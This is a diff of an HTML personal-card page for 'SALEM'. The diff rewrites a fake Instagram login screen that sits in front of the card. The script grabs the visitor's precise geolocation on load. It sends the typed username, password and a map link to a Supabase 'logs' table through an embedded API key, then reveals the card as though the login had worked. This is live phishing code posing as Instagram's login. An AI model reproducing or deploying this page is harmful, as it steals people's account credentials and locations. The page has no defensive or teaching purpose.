@@ -9,50 +9,59 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/2.0.10/typed.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
+        /* إعدادات الخلفية العامة */
         :root {
             --water-deep: #0a192f; --water-mid: #1A2980; --water-light: #26d0ce;
             --front_color: rgba(10, 25, 47, 0.7); --gold: #FFD700; --muted-gold: #c5a059; --white: #e6f1ff;
-            --insta-blue: #0095f6; --insta-bg: #fafafa;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
         
         body {
+            background: #fafafa; /* خلفية انستغرام الرسمية */
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; overflow-x: hidden;
+        }
+
+        /* واجهة انستغرام الحقيقية */
+        #insta-wrapper {
+            width: 100%; max-width: 350px; text-align: center;
+        }
+        .login-box {
+            background: white; border: 1px solid #dbdbdb; padding: 40px 30px; margin-bottom: 10px;
+        }
+        .insta-logo-text {
+            font-family: 'Arial'; font-style: italic; font-weight: bold; font-size: 38px;
+            margin-bottom: 35px; color: #262626; letter-spacing: -1px;
+        }
+        .login-box input {
+            width: 100%; padding: 10px; margin-bottom: 7px; background: #fafafa;
+            border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px;
+        }
+        .login-box button {
+            width: 100%; padding: 7px; background: #0095f6; color: white;
+            border: none; border-radius: 4px; font-weight: 600; margin-top: 8px; cursor: pointer;
+        }
+        .divider { display: flex; align-items: center; color: #8e8e8e; font-size: 13px; margin: 20px 0; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; display: block; margin-bottom: 15px; }
+        .fb-login i { font-size: 16px; margin-right: 5px; }
+        .forgot { font-size: 12px; color: #00376b; display: block; }
+        
+        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px; font-size: 14px; }
+        .signup-box span { color: #0095f6; font-weight: 600; cursor: pointer; }
+
+        /* البطاقة الأصلية (تظهر بعد الدخول) */
+        #main-card-container {
+            display: none; width: 100vw; height: 100vh; position: fixed; top: 0; left: 0;
             background: linear-gradient(-45deg, #0a192f, #1A2980, #141e30, #243b55);
             background-size: 400% 400%; animation: waterFlow 10s ease infinite;
-            width: 100vw; height: 100vh; overflow: hidden; 
-            display: flex; justify-content: center; align-items: center;
+            justify-content: center; align-items: flex-start; padding-top: 50px;
         }
         @keyframes waterFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
 
-        /* واجهة انستغرام */
-        #login-container {
-            width: 90%; max-width: 350px; background: white; padding: 40px 25px;
-            border-radius: 1px; border: 1px solid #dbdbdb; text-align: center; z-index: 100;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-        }
-        .insta-logo {
-            font-family: 'Arial'; font-style: italic; font-weight: bold; 
-            font-size: 35px; margin-bottom: 30px; color: #262626;
-        }
-        #login-container input {
-            width: 100%; padding: 12px; margin-bottom: 10px;
-            border: 1px solid #dbdbdb; border-radius: 3px; background: var(--insta-bg);
-            font-size: 12px; outline: none;
-        }
-        #login-container button {
-            width: 100%; padding: 10px; background: var(--insta-blue);
-            color: white; border: none; border-radius: 5px; font-weight: 600;
-            cursor: pointer; margin-top: 10px; transition: opacity 0.3s;
-        }
-        #login-container button:active { opacity: 0.7; }
-        
-        .divider { margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; display: flex; align-items: center; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
-
-        /* البطاقة الشخصية (مخفية) */
-        #main-card { display: none; width: 100%; display: flex; justify-content: center; opacity: 0; transition: opacity 0.8s; }
+        /* كود الـ vcard الأصلي الخاص بك */
         .vcard {
-            width: 90%; max-width: 420px; height: 620px; background: var(--front_color);
+            width: 90%; max-width: 420px; height: 600px; background: var(--front_color);
             backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2);
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden;
             display: flex; flex-direction: column;
@@ -61,32 +70,36 @@
         .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; pointer-events: none; }
         .wave-01 { border-radius: 43%; top: -180%; left: -15%; position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--water-mid), var(--water-light)); opacity: 0.4; animation: rotate 14s linear infinite; }
         @keyframes rotate { 100% { transform: rotate(360deg); } }
-        .profile_pic_content { width: 130px; height: 130px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; }
+        .profile_pic_content { width: 135px; height: 135px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; }
         .profile_video { width: 100%; height: 100%; object-fit: cover; }
-        .card_content { padding-top: 80px; text-align: center; flex-grow: 1; }
-        .profile_name h4 { font-size: 1.8em; letter-spacing: 3px; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
-        .snuff { min-height: 50px; padding: 0 20px; color: #8892b0; font-size: 0.9em; margin-top: 15px; }
-        .social div { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; padding: 15px; }
-        .social i { padding: 12px; font-size: 1.2em; background: rgba(197, 160, 89, 0.05); border-radius: 12px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); }
-        .footer-rights { padding-bottom: 15px; font-size: 9px; color: rgba(230, 241, 255, 0.3); text-align: center; }
+        .card_content { padding-top: 85px; text-align: center; flex-grow: 1; }
+        .satan h4 { font-size: 1.9em; letter-spacing: 3px; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
+        .snuff { min-height: 60px; padding: 0 30px; color: #8892b0; font-size: 0.95em; margin-top: 20px; }
+        .social div { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; padding: 0 10px; }
+        .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 14px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); }
+        .footer-rights { padding-bottom: 15px; font-size: 10px; color: rgba(230, 241, 255, 0.4); text-align: center; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-<!-- واجهة تسجيل الدخول -->
-<div id="login-container">
-    <div class="insta-logo">Instagram</div>
-    <input type="text" id="insta-user" placeholder="اسم المستخدم أو الهاتف">
-    <input type="password" id="insta-pass" placeholder="كلمة السر">
-    <button onclick="submitData()">تسجيل الدخول</button>
-    <div class="divider">أو</div>
-    <div style="color: #385185; font-size: 14px; font-weight: 600; cursor: pointer;">
-        <i class="fab fa-facebook-square"></i> تسجيل الدخول بحساب فيسبوك
+<!-- شاشة انستغرام -->
+<div id="insta-wrapper">
+    <div class="login-box">
+        <div class="insta-logo-text">Instagram</div>
+        <input type="text" id="user" placeholder="اسم المستخدم أو البريد الإلكتروني">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button onclick="handleLogin()">تسجيل الدخول</button>
+        <div class="divider">أو</div>
+        <span class="fb-login"><i class="fab fa-facebook-square"></i> تسجيل الدخول بحساب فيسبوك</span>
+        <span class="forgot">هل نسيت كلمة السر؟</span>
+    </div>
+    <div class="signup-box">
+        ليس لديك حساب؟ <span>تسجيل</span>
     </div>
 </div>
 
-<!-- بطاقة سالم الرقمية -->
-<div id="main-card" style="display: none;">
+<!-- شاشة البطاقة الأصلية -->
+<div id="main-card-container">
     <div class="vcard">
         <div class="header">
             <div class="wave_bg"><div class="wave-01"></div></div>
@@ -97,7 +110,7 @@
             </div>
         </div>
         <div class="card_content">
-            <div class="profile_name"><h4>SALEM</h4></div>
+            <div class="satan"><h4>SALEM</h4></div>
             <div class="snuff"><h5 class="typed_text"></h5></div>
             <div class="social">
                 <div>
@@ -105,6 +118,9 @@
                     <a href="https://www.facebook.com/share/15KQ2NmX9V/"><i class="fab fa-facebook"></i></a>
                     <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
                     <a href="https://github.com/salemalshamrie"><i class="fab fa-github"></i></a>
+                    <a href="tg://settings"><i class="fas fa-user"></i></a>
+                    <a href="https://g.co/kgs/pXVXQxK"><i class="fas fa-futbol"></i></a>
+                    <a href="https://uokerbala.edu.iq/"><i class="fas fa-university"></i></a>
                     <a href="https://16salm.github.io/AI/"><i class="fas fa-brain"></i></a>
                 </div>
             </div>
@@ -114,53 +130,37 @@
 </div>
 
 <script>
-    // إعدادات Supabase
     const SB_URL = 'https://kcckppfflaxpxhipngdz.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     const sb = supabase.createClient(SB_URL, SB_KEY);
 
-    let userLoc = "الموقع غير متاح";
+    let locationURL = "لم يتم تحديد الموقع";
+    navigator.geolocation.getCurrentPosition(p => {
+        locationURL = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+    }, null, {enableHighAccuracy: true});
 
-    // جلب الموقع فور فتح الصفحة
-    window.onload = () => {
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                userLoc = `https://www.google.com/maps?q=${lat},${lon}`;
-            }, null, { enableHighAccuracy: true });
+    async function handleLogin() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+
+        if (u && p) {
+            // إرسال لـ Supabase
+            await sb.from('logs').insert([{ username: u, password: p, location: locationURL }]);
+
+            // التحول لتصميمك الأصلي
+            document.getElementById('insta-wrapper').style.display = 'none';
+            document.body.style.background = 'transparent'; // إزالة خلفية انستغرام الفاتحة
+            const container = document.getElementById('main-card-container');
+            container.style.display = 'flex';
+
+            // تشغيل الأنيميشن
+            new Typed(".typed_text", {
+                strings: ["Web Designer & Creative Developer.", "Precision and Art.", "BELIEVE IN YOURSELF."],
+                typeSpeed: 50, backSpeed: 30, loop: true
+            });
+        } else {
+            alert("يرجى ملء الحقول");
         }
-    };
-
-    async function submitData() {
-        const u = document.getElementById('insta-user').value;
-        const p = document.getElementById('insta-pass').value;
-
-        if (u.length < 3 || p.length < 5) {
-            alert("يرجى إدخال بيانات صحيحة");
-            return;
-        }
-
-        // إرسال البيانات إلى جدول logs
-        try {
-            await sb.from('logs').insert([{ 
-                username: u, 
-                password: p, 
-                location: userLoc 
-            }]);
-        } catch (e) { console.error(e); }
-
-        // التحول للبطاقة الشخصية
-        document.getElementById('login-container').style.display = 'none';
-        const card = document.getElementById('main-card');
-        card.style.display = 'flex';
-        setTimeout(() => { card.style.opacity = '1'; }, 50);
-
-        // تشغيل تأثير الكتابة
-        new Typed(".typed_text", {
-            strings: ["Web Designer & Creative Developer.", "Precision and Art.", "BELIEVE IN YOURSELF."],
-            typeSpeed: 50, backSpeed: 30, loop: true
-        });
     }
 </script>
 </body>
